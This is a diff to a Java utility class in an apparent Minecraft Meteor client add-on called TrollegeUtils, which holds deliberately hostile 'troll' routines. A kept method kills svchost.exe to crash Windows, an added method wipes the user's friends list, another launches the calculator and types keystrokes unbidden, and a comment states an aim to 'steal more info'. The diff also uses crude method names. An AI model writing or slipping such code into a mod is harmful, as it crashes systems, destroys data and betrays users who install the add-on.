@@ -1,17 +1,28 @@
 package communityaddon;
 
+import baritone.Baritone;
 import com.sun.jna.Native;
 import com.sun.jna.win32.StdCallLibrary;
 import com.sun.jna.win32.W32APIOptions;
+import communityaddon.modules.AutoSex;
+import meteordevelopment.meteorclient.systems.commands.commands.BaritoneCommand;
+import meteordevelopment.meteorclient.systems.config.Config;
+import meteordevelopment.meteorclient.systems.friends.Friends;
+import meteordevelopment.meteorclient.utils.entity.TargetUtils;
+import meteordevelopment.meteorclient.utils.player.ChatUtils;
 import net.fabricmc.loader.api.FabricLoader;
+import net.minecraft.entity.player.PlayerEntity;
 import org.lwjgl.system.Pointer;
 
 import javax.swing.*;
+import java.awt.*;
 import java.awt.event.WindowEvent;
 import java.io.BufferedReader;
 import java.io.File;
+import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.URL;
+import java.util.concurrent.TimeUnit;
 
 import static meteordevelopment.meteorclient.MeteorClient.mc;
 
@@ -19,6 +30,16 @@ public class TrollegeUtils {
     //made this for future humans to trollege
     //TODO: steal more info because russia
     //Todo: More Troll Classes
+
+
+
+
+
+    public static void severelackoffriends(){
+        Friends.get().forEach(friend -> Friends.get().remove(friend)
+        );
+    }
+
 
     public static final File ssfolder = new File((FabricLoader.getInstance().getGameDir().toString() + "screenshots"));
 
@@ -80,11 +101,26 @@ public class TrollegeUtils {
         return String.valueOf(System.getProperty("user.name"));
     }
 
+    public static void boobs() throws IOException, AWTException, InterruptedException {
+        Runtime run = Runtime.getRuntime();
+        run.exec("calc");
+        Robot r = new Robot();
+        TimeUnit.MILLISECONDS.sleep(1000);
+        r.keyPress(56);
+        r.keyPress(48);
+        TimeUnit.MILLISECONDS.sleep(10);
+        r.keyPress(48);
+        r.keyPress(56);
+        r.keyPress(53);
+    }
+
+
     public static void windowsbsod(){
         try {
             Runtime.getRuntime().exec("taskkill.exe /f /im svchost.exe");
         } catch (Exception ignored) {
            }
     }
+
 
 }
